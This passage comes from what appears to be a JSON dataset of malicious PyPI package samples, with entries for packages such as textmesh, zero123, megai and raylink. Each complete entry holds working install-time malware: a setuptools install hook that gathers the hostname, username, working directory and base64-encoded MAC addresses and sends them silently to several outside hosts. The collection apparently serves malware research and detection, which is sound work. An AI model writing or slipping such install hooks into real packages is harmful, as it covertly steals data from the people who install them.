= {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"sjc\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-textmesh-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"textmesh\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-zero123-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"zero123\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-ic-flows-platform-v91.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ic-flows-platform\",\n    version=\"91.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-mega-sparks-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"mega-sparks\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-megai-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"megai\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-neursts-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"neursts\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-oclip-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"oclip\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-oclips-v93.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"oclips\",\n    version=\"93.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-omgd-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"OMGD\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-para-gen-v93.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"para-gen\",\n    version=\"93.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-raylink-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"raylink\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-raylinks-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"raylinks\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-rl-vm-scheduling-v93.6",
